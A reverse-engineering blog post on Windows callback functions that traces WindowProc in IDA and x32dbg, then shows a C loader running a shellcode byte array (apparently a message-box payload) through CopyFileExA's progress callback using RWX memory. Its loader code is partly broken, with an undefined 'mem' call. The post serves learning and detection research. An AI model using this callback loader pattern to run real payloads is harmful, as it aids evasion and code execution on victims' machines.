---
layout: post
title: "Windows Callback Function Conundrum"
date: 2025-11-09
categories: [reverse engineering]
---

![callback-1.png](/images/2025-11-09/callback-1.png)

##### Table of Contents:
1. [What is Windows Callback Function and how does it used in software development ](#what-is-windows-callback-function-and-how-does-it-used-in-software-development )
2. [What specifically makes this pattern of callback function vulnerable](#what-specifically-makes-this-pattern-of-callback-function-vulnerable)
3. [How does the vulnerability occurs and works under the hood](#how-does-the-vulnerability-occurs-and-works-under-the-hood)
4. [References](#references)

##### What is Windows Callback Function and how does it used in software development 

Based on [MSDN](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nc-winuser-wndproc), a callback function where the system will call automatically whenever certain events happen to a windows for instance a button click, resizing applications, typing input and etc. It's main function is to handle or respond to events. 

In much more simpler terms, a callback function is a function where programmer write, but the system calls, to handle specific events during the program's execution. Let's take a look how CALLBACK is used in a prototype function of **WindowProc()** function:

```c
LRESULT CALLBACK WindowProc(HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam);
```

The keyword of CALLBACK defines how functions is called internally by Windows. Referring to the [Old New Thing](https://devblogs.microsoft.com/oldnewthing/20040108-00/?p=41163) by Raymond Chen, the CALLBACK is actually a macro that expands to `__stdcall`, which specifies the calling convention used by Win32 API. 

Here is a simple C code which showcase the utilization of **WindowProc()** to execute a GUI application with text. 

```c
#include <windows.h>

// Forward declaration
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow)
{
    const char CLASS_NAME[] = "Sample Window Class";
    
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    
    RegisterClass(&wc);
    
    HWND hwnd = CreateWindowEx(
        0, CLASS_NAME, "Sample Window",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 640, 480,
        NULL, NULL, hInstance, NULL
    );
    
    if (hwnd == NULL) return 0;
    
    ShowWindow(hwnd, nCmdShow);
    
    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
        case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            TextOut(hdc, 10, 10, "Hello, Windows!", 15);
            EndPaint(hwnd, &ps);
            return 0;
        }
        
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
```

##### How does the execution flow of Callback function occurs at lower level

Now let's use IDA decompiler and x32dbg to trace the execution flow of CALLBACK WindowProc, observe what happens under the hood. 

At first **WinMain** builds `WNDCLASS` and calls `CreateWindowsExA` as the [window handle](https://learn.microsoft.com/en-us/windows/apps/develop/ui-input/retrieve-hwnd)  `HWND hwnd = CreateWindowEx(...)`

![callback-2.png](/images/2025-11-09/callback-2.png)

From the assembly instruction, we notice the function of `_WindowProc@16` is saved as and address into `WndClass.lpfnWndProc` field. This process is letting Windows to know which function to call for messages. 

![callback-3.png](/images/2025-11-09/callback-3.png)

Next when reached `CreateWindowsExA`, we can notice how the arguments are passed from right to left before it call `CreateWindowsExA`. This is the logical ordering required by the callee is preserved and part of the `__stdcall` calling convention. 

![callback-4.png](/images/2025-11-09/callback-4.png)

After `CreateWindowsExA`, there is a message loop that calls `GetMessageA`, `TranslateMessage` and `DispatchMessageA`. This loop function lookups the `WindowProc` for the windows and calls it and then transfer control into Windows. 

![gif](/images/2025-11-09/callback-1.gif)

Checking back with IDA, yes there is the loop function where `WindowProc` is passed and the handler is the one will be referred by `WindowProc` and later will print out the string "Hello, Windows!"

![callback-5.png](/images/2025-11-09/callback-5.png)

Whatever we have observed so far, we able to conclude where `WinMain` passes the address of `WindowProc` into `WNDCLASS` structure. Next, `RegisterClass()` and `CreateWindowsEx()` link that callback with the actual window handle (`HWND`). Then, the message loop continues dispatches system messages to `WindowProc`, where the string `Hello, Windows!` appears. The string appear first because of the functions `BeginPaint`, `TextOut` and `EndPaint` which will then received by `GetMessageA`. 

Here comes the questions, everything seems harmless and safe, until we realize one thing. Callback are just function pointers. And what if, instead of pointing to a safe function, we point it to somewhere else ? 

Everything we’ve seen so far is normal API plumbing: `WinMain` writes a function pointer into `WNDCLASS.lpfnWndProc`, `RegisterClass` records it, `CreateWindowEx` associates it with an `HWND`, and `DispatchMessage` calls it. That flow is safe **as long as the pointer can’t be tampered with**.

The danger arises when attacker can influence or overwrite that function pointer or any other user-mode callback that the system will later call. From [Unit42 article](https://unit42.paloaltonetworks.com/win32k-analysis-part-1/#post-128455-_mn6uzitnlpua) which discuss about the exploitation implement of Win32k, it can be abused when memory corruption flaws that allow arbitraty writes or object corruption. 

##### What specifically makes this pattern of callback function vulnerable

1. Callback are implicit execution transfer points.
	Windows trusts the function pointer it finds in a class/window structure and will call it later. This indirection makes it convenient and easy target for red teamers to manipulate and perform shellcode injection.
2. Mutable in-memory structure.
	Historically, some GUI-related structures or adjacent memory regions were stored in user-mode or were insufficiently locked before the kernel made user-mode callbacks. That created opportunities for race conditions, use-after-free, or out-of-bounds writes to corrupt function pointers or adjacent metadata.
3. Arbitrary write/read primitives chain into code execution.
	If an attacker gains arbitrary write primitive, it can either overwrite a callback pointer directly or craft fake objects that cause the system to call into attacker-controlled memory. This makes it effective to run shellcode when the OS later will invokes that pointer.

##### How does the vulnerability occurs and works under the hood 

This research came out when I played a reserve engineering challenge created by [Fareed Fauzi](https://www.youtube.com/watch?v=0RV7wyB3Mb0) and after it ended, I had a discussion with him and talked about my findings where the challenge uses `EnumDesktopA` to execute the shellcode. Here is my writeup for that [challenge](https://shreethaar.github.io/ctf-writeups/writeups/2025/neraca/rc6/). 

Now let's take an easy example of Windows API function, [`CopyFileExA`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-copyfileexa) function. The function will copy an existing file to a new file. Here is the function parameter syntax in C++:
```c++
BOOL CopyFileExA(
  [in]           LPCSTR             lpExistingFileName,
  [in]           LPCSTR             lpNewFileName,
  [in, optional] LPPROGRESS_ROUTINE lpProgressRoutine,
  [in, optional] LPVOID             lpData,
  [in, optional] LPBOOL             pbCancel,
  [in]           DWORD              dwCopyFlags
);
```

According to the MSDN documentation, it list what type of parameters it takes in:
- `lpExistingFileName`: A pointer to a constant string 
- `lpNewFileName`: A pointer to a constant string
- [`lpProgressRoutine`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nc-winbase-lpprogress_routine): A pointer to a callback function of `CopyProgressRoutine`
- `lpData`: User-defined data passed to the callback on each invocation
- `pbCancel`: TRUE/FALSE value will determine the copy operation 
- `dwCopyFlags`: Specify how files to be copied with different values  

Since `CopyFileExA` accepts a callback function pointer (`lpProgressRoutine`) that it invokes during file operations, we can exploit this mechanism by passing a pointer to our shellcode instead, effectively hijacking the callback to execute arbitrary code. Here is how we can do it:

```c
#include <windows.h>
#include <stdio.h>

//shellcode: https://www.exploit-db.com/exploits/37758 
unsigned char payload[] = {0x33,0xc9,0x64,0x8b,0x49,0x30,0x8b,0x49,0x0c,0x8b,0x49,0x1c,0x8b,0x59,0x08,0x8b,0x41,0x20,0x8b,0x09,0x80,0x78,0x0c,0x33,0x75,0xf2,0x8b,0xeb,0x03,0x6d,0x3c,0x8b,0x6d,0x78,0x03,0xeb,0x8b,0x45,0x20,0x03,0xc3,0x33,0xd2,0x8b,0x34,0x90,0x03,0xf3,0x42,0x81,0x3e,0x47,0x65,0x74,0x50,0x75,0xf2,0x81,0x7e,0x04,0x72,0x6f,0x63,0x41,0x75,0xe9,0x8b,0x75,0x24,0x03,0xf3,0x66,0x8b,0x14,0x56,0x8b,0x75,0x1c,0x03,0xf3,0x8b,0x74,0x96,0xfc,0x03,0xf3,0x33,0xff,0x57,0x68,0x61,0x72,0x79,0x41,0x68,0x4c,0x69,0x62,0x72,0x68,0x4c,0x6f,0x61,0x64,0x54,0x53,0xff,0xd6,0x33,0xc9,0x57,0x66,0xb9,0x33,0x32,0x51,0x68,0x75,0x73,0x65,0x72,0x54,0xff,0xd0,0x57,0x68,0x6f,0x78,0x41,0x01,0xfe,0x4c,0x24,0x03,0x68,0x61,0x67,0x65,0x42,0x68,0x4d,0x65,0x73,0x73,0x54,0x50,0xff,0xd6,0x57,0x68,0x72,0x6c,0x64,0x21,0x68,0x6f,0x20,0x57,0x6f,0x68,0x48,0x65,0x6c,0x6c,0x8b,0xcc,0x57,0x57,0x51,0x57,0xff,0xd0,0x57,0x68,0x65,0x73,0x73,0x01,0xfe,0x4c,0x24,0x03,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x54,0x53,0xff,0xd6,0x57,0xff,0xd0};

DWORD CALLBACK CopyProgressRoutine(
    LARGE_INTEGER TotalFileSize,
    LARGE_INTEGER TotalBytesTransferred,
    LARGE_INTEGER StreamSize,
    LARGE_INTEGER StreamBytesTransferred,
    DWORD dwStreamNumber,
    DWORD dwCallbackReason,
    HANDLE hSourceFile,
    HANDLE hDestinationFile,
    LPVOID lpData) {
        
        lpData = VirtualAlloc(NULL,sizeof(payload),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
        RtlMoveMemory(lpData,payload,sizeof(payload));
            
        // ways to execute shellcode:
        // Method 1: cast memory pointer to a function pointer and call it
        
        void (*func)() = (void(*)())lpData;
        func();            
        VirtualFree(lpData,0,MEM_RELEASE);
        
        // Method 2: Direct cast and call 
        ((void(*)())mem();
        
        // Method 3: Using CreateThread (runs in separate thread) 
        HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)lpData,NULL,0,NULL);
        if(hThread) {
            WaitForSingleObject(hThread,INFINITE);
            CloseHandle(hThread);
        }

        double percent = (double)TotalBytesTransferred.QuadPart / TotalFileSize.QuadPart * 100.0;
        printf("\rCopy progress: %.2f%%", percent);
        fflush(stdout);
        return PROGRESS_CONTINUE;
    }

int main(void) {
    LPCSTR src = "C:\\Users\\FlareVM\\Desktop\\example.txt";
    LPCSTR dst = "C:\\Users\\FlareVM\\Desktop\\example_copy.txt";

    BOOL result = CopyFileExA(
        src,                  // Source file
        dst,                  // Destination file
        CopyProgressRoutine,  // Progress callback
        NULL,                 // User data
        NULL,                 // Cancel flag
        0                     // Flags (0 = default behavior)
    );

    if (!result) {
        DWORD err = GetLastError();
        printf("\nFailed to copy file. Error code: %lu\n", err);
        return 1;
    }

    printf("\nFile copied successfully.\n");
    return 0;

// Compile: i686-w64-mingw32-gcc main.c -o main.exe -Wall -Wl,--disable-dynamicbase
}
```

Here it how it works when executed:
![gif](/images/2025-11-09/callback-2.gif)

Using x32dbg to debug it, we notice the shellcode execute at here:

![callback-6.png](/images/2025-11-09/callback-6.png)

In a nutsell, we noticed that the execution flow goes like this:
main -> CopyFileExA -> CopyProgressRoutine -> VirtualAlloc -> RtlMoveMemory -> shellcode execution.

For this exploration journey of understanding how Windows callback functions as shellcode execution vectors with an example of `CopyFileEx`. There are more Windows API function has the capability to execute shellcode via callback, which can be found [here](https://github.com/aahmad097/AlternativeShellcodeExec). This technique discussed here underscore the importance of how monitoring callback registration at kernel level, tracking memory allocations with executable permissions and maintaining comprehensive visibility into process behaviors that deviate from expected patterns. 

However this exploration is not well executed as pre-plan because:
- shellcode does not return back to execute VirtualFree and then return back to main function
- only utilizing `LPPROGRESS_ROUTINE` as a function pointer itself to execute shellcode rather than creating a separate function for `CopyProgressRoutine`.  

##### References:
1. [https://learn.microsoft.com/en-us/windows/win32/api/winuser/nc-winuser-wndproc](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nc-winuser-wndproc)
2. [https://stackoverflow.com/questions/11066202/what-does-callback-in-a-windows-api-function-declaration-mean](https://stackoverflow.com/questions/11066202/what-does-callback-in-a-windows-api-function-declaration-mean)
3. [https://unit42.paloaltonetworks.com/win32k-analysis-part-1/#post-128455-_mn6uzitnlpua](https://unit42.paloaltonetworks.com/win32k-analysis-part-1/#post-128455-_mn6uzitnlpua)
4. [https://www.bordergate.co.uk/callback-shellcode-execution/](https://www.bordergate.co.uk/callback-shellcode-execution/)
5. [https://shreethaar.github.io/ctf-writeups/writeups/2025/neraca/rc6/](https://shreethaar.github.io/ctf-writeups/writeups/2025/neraca/rc6/)
6. [https://cocomelonc.github.io/tutorial/2022/06/27/malware-injection-20.html](https://cocomelonc.github.io/tutorial/2022/06/27/malware-injection-20.html)
7. [https://github.com/aahmad097/AlternativeShellcodeExec](https://github.com/aahmad097/AlternativeShellcodeExec) 

